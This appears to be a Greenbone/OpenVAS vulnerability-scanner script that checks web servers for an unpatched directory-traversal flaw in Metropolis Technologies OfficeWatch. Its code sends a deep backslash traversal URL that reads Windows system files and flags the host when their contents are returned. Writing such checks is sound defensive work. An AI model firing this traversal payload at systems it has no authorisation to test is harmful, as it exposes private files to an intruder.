if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103502" );
	script_bugtraq_id( 49921 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Metropolis Technologies OfficeWatch Directory Traversal Vulnerability" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-06-27 13:52:32 +0200 (Wed, 27 Jun 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_mandatory_keys( "Host/runs_windows" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49921" );
	script_xref( name: "URL", value: "http://www.metropolis.com/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/519990" );
	script_tag( name: "summary", value: "Metropolis Technologies OfficeWatch is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input data." );
	script_tag( name: "impact", value: "Exploiting the issue may allow an attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
res = http_get_cache( port: port, item: "/" );
if(!res || !ContainsString( res, "<title>OfficeWatch" )){
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

